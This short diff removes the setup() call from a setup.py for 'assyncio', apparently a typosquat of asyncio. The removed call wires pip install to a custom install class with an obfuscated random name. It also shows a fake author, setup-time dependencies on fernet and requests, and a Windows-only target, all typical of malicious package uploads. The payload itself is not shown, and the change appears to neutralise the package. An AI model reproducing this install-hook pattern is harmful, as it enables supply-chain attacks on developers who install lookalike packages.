@@ -18,22 +18,5 @@ class ZGkIpXtGYkZsZrhKsWIehxxqAoFFazhZJQJgvpwDKjrTnOAlVKQYVfJVgJQGETCeyEKloMnnyc
             install.run(self)
 
 
-setup(
-    name="assyncio",
-    version=VERSION,
-    author="DLrIQNkrQZhPM",
-    author_email="QuALQVLVkuyCQjKBiI@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ZGkIpXtGYkZsZrhKsWIehxxqAoFFazhZJQJgvpwDKjrTnOAlVKQYVfJVgJQGETCeyEKloMnnycQQEOwvwBYrZGGpSzGqmqPJEUDnmjuFujhQmySVwSkNmlvbzKMSyhUROCKYzpyuWiorAUzsKzueKoztfSfFkFXLMFp,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
